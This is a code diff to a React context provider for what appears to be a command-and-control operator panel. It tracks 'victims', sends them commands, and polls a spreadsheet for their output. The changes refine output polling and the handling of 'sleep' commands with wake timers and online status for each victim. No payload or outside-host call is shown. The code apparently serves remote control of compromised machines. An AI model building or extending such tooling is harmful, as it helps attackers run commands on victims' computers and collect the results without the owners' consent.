@@ -36,6 +36,7 @@ export function AppProvider({ children }) {
   const [polling, setPolling]           = useState(false);
   const pollTimerRef  = useRef(null);
   const pollCountRef  = useRef(0);
+  const onPollOutputRef = useRef(null);
   const sleepWakeTimersRef = useRef({});
   const activeVictimRef = useRef(activeVictim);
   const victimsRef = useRef(victims);
@@ -90,6 +91,10 @@ export function AppProvider({ children }) {
         const sleepEntry = prev[victim.id];
         if (!sleepEntry || sleepEntry.state === 'ready') return prev;
         if (new Date(sleepEntry.wakeAt) > new Date()) return prev;
+        if (sleepEntry.rowIndex) {
+          const sleepRow = fetched.find((r) => r.rowIndex === sleepEntry.rowIndex);
+          if (!sleepRow?.output) return prev;
+        }
         return {
           ...prev,
           [victim.id]: { ...sleepEntry, state: 'ready' },
@@ -148,16 +153,17 @@ export function AppProvider({ children }) {
       pollTimerRef.current = null;
     }
     pollCountRef.current = 0;
+    onPollOutputRef.current = null;
     setPolling(false);
     setPendingRow(null);
   }, []);
 
   // ── Start smart polling after a command is sent ───────────────────────────
   // Polls every POLL_INTERVAL_MS and stops as soon as the target row has output.
-  const startPolling = useCallback((targetRowIndex) => {
-    // Clear any previous poll
+  const startPolling = useCallback((targetRowIndex, { onOutput } = {}) => {
     if (pollTimerRef.current) clearInterval(pollTimerRef.current);
     pollCountRef.current = 0;
+    onPollOutputRef.current = onOutput || null;
     setPendingRow(targetRowIndex);
     setPolling(true);
 
@@ -170,16 +176,15 @@ export function AppProvider({ children }) {
       const fetched = await fetchRowsRaw(victim);
 
       if (fetched) {
-        // Find the row we're waiting on (rowIndex is 1-based)
         const targetRow = fetched.find(r => r.rowIndex === targetRowIndex);
         if (targetRow && targetRow.output) {
-          // Got the response — stop polling
+          const done = onPollOutputRef.current;
           stopPolling();
+          done?.();
           return;
         }
       }
 
-      // Safety: stop after MAX_POLL_ATTEMPTS
       if (pollCountRef.current >= MAX_POLL_ATTEMPTS) {
         stopPolling();
       }
@@ -252,16 +257,18 @@ export function AppProvider({ children }) {
 
       if (sleepCommand && sleepMs !== null) {
         const wakeAt = new Date(Date.now() + sleepMs);
+        const victimId = activeVictimRef.current.id;
         setSleepStatus((prev) => ({
           ...prev,
-          [activeVictimRef.current.id]: {
+          [victimId]: {
             wakeAt,
             duration: trimmed.substring(6).trim(),
             command: trimmed,
+            rowIndex: nextRowIndex,
             state: 'sleeping',
           },
         }));
-        setVictimOnline(activeVictimRef.current.id, true);
+        setVictimOnline(victimId, true);
       } else if (!activeSleep) {
         startPolling(nextRowIndex);
       }
@@ -318,22 +325,37 @@ export function AppProvider({ children }) {
     }
   }, [isConfigured]);
 
-  // When wakeAt elapses, verify the sheet and flip sleeping → ready | waiting
-  const resolveSleepWake = useCallback(async (victimId) => {
+  // When wakeAt elapses, update status and poll the sheet until sleep output appears
+  const resolveSleepWake = useCallback(async (victimId, rowIndex) => {
     const victim = victimsRef.current.find((v) => String(v.id) === String(victimId));
     if (!victim || !isConfigured) return;
 
-    const rowsForVictim = await fetchRowsForVictim(victim);
-    if (rowsForVictim) {
+    const isActive = String(activeVictimRef.current?.id) === String(victimId);
+    const rowsForVictim = isActive
+      ? await fetchRowsRaw(victim)
+      : await fetchRowsForVictim(victim);
+
+    const markSleepReady = () => {
       setSleepStatus((prev) => {
         const entry = prev[victimId];
         if (!entry || entry.state === 'ready') return prev;
         return { ...prev, [victimId]: { ...entry, state: 'ready' } };
       });
       setVictimOnline(victimId, true);
-      if (activeVictimRef.current?.id === victimId) {
-        setRows(rowsForVictim);
-        setLastRefresh(new Date());
+    };
+
+    if (rowsForVictim) {
+      const targetRow = rowIndex
+        ? rowsForVictim.find((r) => r.rowIndex === rowIndex)
+        : null;
+      const hasOutput = !!targetRow?.output;
+
+      if (hasOutput) {
+        markSleepReady();
+      } else if (isActive && rowIndex) {
+        startPolling(rowIndex, { onOutput: markSleepReady });
+      } else {
+        markSleepReady();
       }
     } else {
       setSleepStatus((prev) => {
@@ -343,7 +365,7 @@ export function AppProvider({ children }) {
       });
       setVictimOnline(victimId, false);
     }
-  }, [isConfigured, fetchRowsForVictim, setVictimOnline]);
+  }, [isConfigured, fetchRowsForVictim, fetchRowsRaw, setVictimOnline, startPolling]);
 
   // Schedule one timer per victim at wakeAt (replaces coarse 10s polling)
   useEffect(() => {
@@ -361,15 +383,16 @@ export function AppProvider({ children }) {
       if (!entry || entry.state !== 'sleeping') continue;
 
       const ms = new Date(entry.wakeAt).getTime() - Date.now();
+      const rowIndex = entry.rowIndex;
       if (ms <= 0) {
-        resolveSleepWake(victimId);
+        resolveSleepWake(victimId, rowIndex);
         continue;
       }
 
       if (timers[victimId]) clearTimeout(timers[victimId]);
       timers[victimId] = setTimeout(() => {
         delete timers[victimId];
-        resolveSleepWake(victimId);
+        resolveSleepWake(victimId, rowIndex);
       }, ms);
     }
   }, [sleepStatus, resolveSleepWake]);
